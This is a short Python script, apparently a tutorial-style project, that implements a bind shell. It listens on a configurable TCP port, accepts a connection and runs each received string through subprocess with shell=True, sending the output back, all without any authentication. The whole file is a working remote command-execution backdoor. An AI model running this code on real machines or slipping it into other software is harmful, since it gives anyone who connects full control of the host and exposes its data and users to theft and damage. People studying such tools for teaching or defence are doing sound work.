import socket
import sys
import os
import subprocess
from dotenv import load_dotenv

load_dotenv()

# Create a socket ( connect two computers )
def create_socket():
    try:
        global host
        global port 
        global s 
        host = "" 
        port = int(os.getenv("PORT"))
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    
    
# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port 
        global s 
        
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)
         
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established")
    print("IP: " + address[0] + "  |  Port: " + str(address[1]))
    while True:
        currentWD = os.getcwd() + "> "
        conn.send(str.encode(currentWD))
        client_res = conn.recv(1024)
        if not client_res:
            print("\nClient disconnected.")
            break

        if client_res.decode("utf-8") == "quit":
            break
        execute_command(client_res, conn)
    
    conn.close()
    s.close()
    print("Server socket closed.")
    sys.exit()
    
def execute_command(cmd, conn):
    decoded = cmd.decode("utf-8", errors="ignore")
    if decoded.startswith("cd "):
        path = decoded[3:].strip()
        try:
            os.chdir(path)
            # send a short, non-empty acknowledgement so client.recv() unblocks
            conn.send(str.encode("\n"))
        except Exception as e:
            conn.send(str.encode(str(e)))
        return
        

    if len(decoded) > 0:
        proc = subprocess.Popen(decoded, shell=True,
                                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = proc.stdout.read() + proc.stderr.read()
        output_str = output_byte.decode("utf-8", errors="ignore")
        # if command has no output, send new line to prevent client.recv() from blocking
        if output_str == "":
            output_str = "\n"
        conn.send(str.encode(output_str))
        print(output_str)
            

            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
    
main()